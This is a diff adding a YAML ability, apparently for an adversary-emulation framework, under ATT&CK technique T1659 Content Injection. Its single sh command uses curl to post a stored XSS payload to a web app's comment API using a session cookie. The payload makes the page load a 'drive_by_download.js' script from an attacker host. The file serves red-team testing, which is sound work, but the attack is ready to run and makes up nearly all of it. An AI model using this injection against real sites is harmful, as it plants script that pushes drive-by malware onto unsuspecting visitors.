@@ -1,0 +1,35 @@
+- tactic: initial-access
+  technique_name: Content Injection
+  technique_id: T1659
+  name: Injection of XSS for Drive BY Download
+  description: Using curl to inject a script to execute a drive by download script
+  executors:
+  - name: sh
+    platform: linux
+    command: ' curl -k -X POST https://192.168.2.1/api/createpost -d ''comment=<img
+      src=x onerror=''\''''var script=document.createElement("script"); script.src="https://192.168.0.10/attacker/drive_by_download.js";
+      document.body.appendChild(script);''\''''>'' -b #{cookie} -i
+
+
+      '
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - initial-access
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 3ca866c4-609f-45da-949b-5289e289668c
